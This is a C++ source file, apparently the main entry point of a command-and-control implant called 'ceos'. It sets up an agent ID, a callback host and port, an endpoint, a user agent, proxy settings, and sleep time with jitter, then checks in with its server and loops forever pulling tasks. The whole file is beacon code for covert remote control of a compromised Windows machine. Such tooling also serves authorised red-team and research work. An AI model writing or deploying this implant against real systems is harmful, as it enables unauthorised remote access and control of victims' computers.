// ceos.cpp : Ce fichier contient la fonction 'main'. L'exécution du programme commence et se termine à cet endroit.
//

#include "ceos.h"
#include "Config.h"

CONFIG_CEOS* ceosConfig = nullptr;

VOID ceosMain()
{
    ceosConfig = (CONFIG_CEOS*)LocalAlloc(LPTR, sizeof(CONFIG_CEOS));
    // Config Init
    ceosConfig->agentID = (PCHAR)initUUID;
    ceosConfig->hostName = (PWCHAR)hostname;
    ceosConfig->httpPort = port;
    ceosConfig->endPoint = (PWCHAR)endpoint;
    ceosConfig->userAgent = (PWCHAR)useragent;
    ceosConfig->httpMethod = (PWCHAR)httpmethod;
    ceosConfig->isSSL = ssl;
    ceosConfig->isProxyEnabled = proxyenabled;
    ceosConfig->proxyURL = (PWCHAR)proxyurl;

    // Convert the sleeptime from seconds to miliseconds
    ceosConfig->sleeptime_ms = 1000 * sleep_time;
    ceosConfig->jitter = jitter_perc;

    ceosConfig->numTasks = num_tasks;

    PParser ResponseParser = checkin();
    parseCheckin(ResponseParser);
    while (TRUE)
        routine();
}

VOID freeCeosConfig()
{
    if (ceosConfig)
        LocalFree(ceosConfig);
    return;
}

VOID setUUID(PCHAR newUUID)
{
    ceosConfig->agentID = newUUID;
    return;
}

